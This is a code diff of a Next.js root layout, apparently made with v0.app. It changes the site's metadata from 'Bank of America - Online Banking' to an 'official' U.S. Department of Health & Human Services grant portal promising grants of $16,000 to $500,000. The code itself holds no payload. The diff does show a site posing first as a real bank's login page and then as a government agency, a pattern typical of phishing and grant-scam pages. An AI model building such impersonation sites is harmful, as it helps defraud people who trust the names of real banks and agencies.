@@ -1,15 +1,17 @@
 import type React from "react"
 import type { Metadata } from "next"
-import { GeistSans } from "geist/font/sans"
-import { GeistMono } from "geist/font/mono"
+import { Geist, Geist_Mono } from "next/font/google"
+import { Analytics } from "@vercel/analytics/next"
 import "./globals.css"
-import { AuthProvider } from "@/lib/auth"
-import { Suspense } from "react"
+
+const _geist = Geist({ subsets: ["latin"] })
+const _geistMono = Geist_Mono({ subsets: ["latin"] })
 
 export const metadata: Metadata = {
-  title: "Bank of America - Online Banking",
-  description: "Bank of America Online Banking",
-    generator: 'v0.app'
+  title: "HHS Grant Portal - Official Government Grant Application System",
+  description:
+    "Apply for U.S. Department of Health & Human Services grants ranging from $16,000 to $500,000. Secure, verified government grant portal.",
+  generator: "v0.app",
 }
 
 export default function RootLayout({
@@ -19,10 +21,9 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
-      <body className={`font-sans ${GeistSans.variable} ${GeistMono.variable}`}>
-        <Suspense fallback={<div>Loading...</div>}>
-          <AuthProvider>{children}</AuthProvider>
-        </Suspense>
+      <body className={`font-sans antialiased`}>
+        {children}
+        <Analytics />
       </body>
     </html>
   )
